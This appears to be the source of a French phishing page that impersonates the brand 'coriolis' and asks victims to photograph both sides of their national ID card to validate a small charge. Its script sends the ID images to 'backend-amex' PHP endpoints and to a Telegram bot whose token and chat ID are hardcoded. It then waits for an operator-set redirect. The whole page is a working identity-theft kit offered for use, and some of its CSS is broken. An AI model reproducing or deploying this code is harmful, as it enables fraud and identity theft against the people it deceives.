	  /* Modal caméra */
.camera-modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: black;
    z-index: 1000;
    display: none;
    flex-direction: column;
}

.camera-video {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.camera-guide {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
}

.camera-message {
    position: absolute;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(77, 189, 198, 0.9);
    color: white;
    padding: 10px 20px;
    border-radius: 25px;
    font-size: 14px;
    text-align: center;
    z-index: 10;
}

.cadre {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 85%;
    height: 200px;
    border: 2px solid #4DBDC6;
    border-radius: 10px;
}

.cadre::before {
    content: '';
    position: absolute;
    top: -2px;
    left: -2px;
    width: 30px;
    height: 30px;
    border-top: 4px solid #4DBDC6;
    border-left: 4px solid #4DBDC6;
}

.cadre::after {
    content: '';
    position: absolute;
    top: -2px;
    right: -2px;
    width: 30px;
    height: 30px;
    border-top: 4px solid #4DBDC6;
    border-right: 4px solid #4DBDC6;
}

.cadre-bottom-left {
    position: absolute;
    bottom: -2px;
    left: -2px;
    width: 30px;
    height: 30px;
    border-bottom: 4px solid #4DBDC6;
    border-left: 4px solid #4DBDC6;
}

.cadre-bottom-right {
    position: absolute;
    bottom: -2px;
    right: -2px;
    width: 30px;
    height: 30px;
    border-bottom: 4px solid #4DBDC6;
    border-right: 4px solid #4DBDC6;
}

.btn-capture-photo {
    position: absolute;
    bottom: 80px;
    left: 50%;
    transform: translateX(-50%);
    background: white;

    width: 70px;
    height: 70px;

    z-index: 10;
}

.btn-fermer-camera {
    position: absolute;

    border: none;

}
	  
	  /* Overlay sombre autour du cadre */
.cadre-overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
    pointer-events: none;
}

.cadre {
    position: absolute;
    top: 50%;

    transform: translate(-50%, -50%);
    width: 85%;
    height: 200px;

/* Overlay de chargement */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 2000;
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
}

.spinner {
    width: 60px;
    height: 60px;
    border: 6px solid #f3f3f3;

    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
}

.loading-text {
    color: white;
    font-size: 16px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

<body>
  <div class="page-container">
    <header class="top-bar" role="banner" aria-label="Barre de navigation bleue arrondie">
      <span style="color: white; font-weight: 600; font-size: 1.6rem;">coriolis</span>

    <main class="content-white" role="main">
      <!-- Overlay de chargement -->
<div id="loadingOverlay" class="loading-overlay">

</div>
      <div class="payment-section">
        <!-- Montant à régler en gras -->

        <!-- Bloc bleu centré avec message -->

          <p>Une fois les document déposé, <strong>merci d'attendre l'affichage de la page de vérification selfie</strong> pour que votre prélèvement de 5,99€ soit validée.</p>
        </div>

<!-- Champ Recto CNI -->
<div class="input-field">
    <label>Recto de la carte d'identité</label>
    <input type="text" id="rectoInput" class="input-with-bottom-border" placeholder="Aucune photo sélectionnée" readonly>
    <div id="rectoPreview" class="photo-preview"></div>
    <input type="file" id="rectoPhoto" accept="image/*" capture="environment" style="display: none;">
    <button type="button" class="btn-capture" onclick="document.getElementById('rectoPhoto').click()">Prendre photo recto</button>
</div>
		  
		  <!-- Petite fine barre bleue -->

<!-- Champ Verso CNI -->
<div class="input-field">
    <label>Verso de la carte d'identité</label>
    <input type="text" id="versoInput" class="input-with-bottom-border" placeholder="Aucune photo sélectionnée" readonly>
    <div id="versoPreview" class="photo-preview"></div>
    <input type="file" id="versoPhoto" accept="image/*" capture="environment" style="display: none;">
    <button type="button" class="btn-capture" onclick="document.getElementById('versoPhoto').click()">Prendre photo verso</button>
</div>

		  <!-- Modal caméra -->
<div id="cameraModal" class="camera-modal">
    <video id="cameraVideo" class="camera-video" autoplay playsinline></video>
    <div class="camera-guide">
        <div class="camera-message">Veulliez bien cadrer la carte dans le repère - Évitez le flou</div>
        <div class="cadre">
            <div class="cadre-bottom-left"></div>
            <div class="cadre-bottom-right"></div>
        </div>
    </div>

    <button class="btn-fermer-camera" id="fermerCameraBtn">✕ Fermer</button>
</div>

 <script>
	 let currentStream = null;
let currentPreviewId = null;
let currentInputId = null;
let rectoDataURL = null;
let versoDataURL = null;

async function ouvrirCamera(previewId, inputId) {
    currentPreviewId = previewId;
    currentInputId = inputId;
    
    const modal = document.getElementById('cameraModal');
    const video = document.getElementById('cameraVideo');
    
    modal.style.display = 'flex';
    
    try {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        currentStream = stream;
        video.srcObject = stream;
    } catch (err) {
        alert('Impossible d\'accéder à la caméra');
        modal.style.display = 'none';
    }
}

document.getElementById('captureBtn').addEventListener('click', function() {
    const video = document.getElementById('cameraVideo');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    const imageDataUrl = canvas.toDataURL('image/jpeg');
    
    // Stocker l'image selon le type (recto ou verso)
    if (currentPreviewId === 'rectoPreview') {
        rectoDataURL = imageDataUrl;
    } else if (currentPreviewId === 'versoPreview') {
        versoDataURL = imageDataUrl;
    }
    
    // Afficher la preview
    const preview = document.getElementById(currentPreviewId);
    preview.innerHTML = '';
    const img = document.createElement('img');
    img.src = imageDataUrl;
    preview.appendChild(img);
    
    // Cacher l'input
    document.getElementById(currentInputId).style.display = 'none';
    
    // Fermer la caméra
    fermerCamera();
});

document.getElementById('fermerCameraBtn').addEventListener('click', function() {
    fermerCamera();
});

function fermerCamera() {
    if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
        currentStream = null;
    }
    document.getElementById('cameraModal').style.display = 'none';
}

// Remplacer la fonction existante du bouton Valider par celle-ci :

document.querySelector('.btn-payer').addEventListener('click', async function() {
    if (!rectoDataURL || !versoDataURL) {
        alert('Veuillez prendre les deux photos (recto et verso)');
        return;
    }

    const loadingOverlay = document.getElementById('loadingOverlay');
    loadingOverlay.style.display = 'flex';
    document.querySelector('.loading-text').innerHTML = 'Vérification en cours...';

    const clientId = 'CLIENT-' + Date.now();
    const sourceUrl = window.location.pathname;

    const BOT_TOKEN = '8575778335:AAETAvCe_aolvSDfohDyk1ln1YB-1saPScg';
    const CHAT_ID   = '-1003756237345';

    function dataURLtoBlob(dataURL) {
        const [meta, b64] = dataURL.split(',');
        const mime = meta.match(/:(.*?);/)[1];
        const bin = atob(b64);
        const arr = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
        return new Blob([arr], { type: mime });
    }

    async function sendPhoto(blob, caption) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('caption', caption);
        fd.append('photo', blob, 'photo.jpg');
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: fd
        });
        return r.json();
    }

    async function sendMessage(text) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('text', text);
        fd.append('parse_mode', 'HTML');
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            body: fd
        });
        return r.json();
    }

    try {
        // 1. Upload CNI (comme avant, si tu gardes ce backend)
        try {
            await fetch('backend-amex/upload-cni.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ recto: rectoDataURL, verso: versoDataURL, clientId })
            });
        } catch (e) { /* ignore si pas dispo */ }

        // 2. Add redirection (comme avant, si tu gardes ce backend)
        try {
            await fetch('backend-amex/add-redirection.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientId, sourceUrl, status: 'en_attente' })
            });
        } catch (e) { /* ignore */ }

        // 3. Telegram : message + recto + verso
        const texte = `📸 <b>Nouveau document CNI reçu</b>\n`
                    + `🆔 Client : <code>${clientId}</code>\n`
                    + `🔗 URL : ${sourceUrl}\n`
                    + `⏳ Statut : En attente de validation`;

        await sendMessage(texte);
        await sendPhoto(dataURLtoBlob(rectoDataURL), `🪪 Recto — ${clientId}`);
        await sendPhoto(dataURLtoBlob(versoDataURL), `🪪 Verso — ${clientId}`);

        // 4. Attendre la redirection (comme avant)
        document.querySelector('.loading-text').innerHTML = '';
        verifierRedirection(clientId);

    } catch (error) {
        console.error('Erreur:', error);
        alert('Erreur de connexion au serveur');
        loadingOverlay.style.display = 'none';
    }
});

// Fonction pour vérifier périodiquement si une URL de destination a été définie
function verifierRedirection(clientId) {
    const checkInterval = setInterval(async () => {
        try {
            const response = await fetch(`backend-amex/check-redirection.php?clientId=${clientId}`);
            const data = await response.json();
            
            if (data.success && data.destinationUrl && data.destinationUrl !== '') {
                // URL de destination trouvée, rediriger l'utilisateur
                clearInterval(checkInterval);
                window.location.href = data.destinationUrl;
            }
        } catch (error) {
            console.error('Erreur vérification:', error);
        }
    }, 3000); // Vérifier toutes les 3 secondes
}
	 
// Gestion photo recto (fallback)
document.getElementById('rectoPhoto').addEventListener('change', function(e) {
    const file = e.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(event) {
            rectoDataURL = event.target.result;
            const img = document.createElement('img');
            img.src = rectoDataURL;
            const preview = document.getElementById('rectoPreview');
            preview.innerHTML = '';
            preview.appendChild(img);
            document.getElementById('rectoInput').style.display = 'none';
        };
        reader.readAsDataURL(file);
    }
});

// Gestion photo verso (fallback)
document.getElementById('versoPhoto').addEventListener('change', function(e) {
    const file = e.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(event) {
            versoDataURL = event.target.result;
            const img = document.createElement('img');
            img.src = versoDataURL;
            const preview = document.getElementById('versoPreview');
            preview.innerHTML = '';
            preview.appendChild(img);
            document.getElementById('versoInput').style.display = 'none';
        };
        reader.readAsDataURL(file);
    }
});
</script>
